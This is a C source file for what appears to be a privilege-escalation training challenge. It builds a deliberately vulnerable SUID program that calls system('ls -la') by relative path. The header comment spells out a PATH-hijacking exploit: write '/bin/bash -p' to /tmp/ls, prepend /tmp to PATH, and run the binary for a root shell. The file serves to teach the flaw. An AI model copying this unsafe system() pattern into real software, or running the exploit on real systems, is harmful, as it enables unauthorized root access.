/*
 * Privilege Escalation Challenge: Advanced - Vulnerable SUID Binary
 *
 * This program is intended to be compiled and installed with the SUID bit set.
 * It calls system("ls") without specifying the full path, making it
 * vulnerable to PATH hijacking.
 *
 * Exploitation:
 *   1. Create a malicious "ls" script: echo '/bin/bash -p' > /tmp/ls
 *   2. Make it executable: chmod +x /tmp/ls
 *   3. Prepend /tmp to PATH: export PATH=/tmp:$PATH
 *   4. Run this binary: /usr/local/bin/vuln_list
 *   5. Get a root shell!
 *
 * Compile: gcc -o vuln_list vulnerable_suid.c
 * Install: sudo cp vuln_list /usr/local/bin/ && sudo chmod u+s /usr/local/bin/vuln_list
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    printf("=== Directory Listing Service ===\n");
    printf("Running as UID: %d, EUID: %d\n", getuid(), geteuid());
    printf("\nListing current directory:\n\n");

    /* VULNERABILITY: system() uses the shell to execute the command,
     * and "ls" is not an absolute path. If an attacker can modify PATH,
     * they can hijack the "ls" command to execute arbitrary code
     * with the privileges of this SUID binary (root). */
    system("ls -la");

    printf("\n=== End of listing ===\n");
    return 0;
}
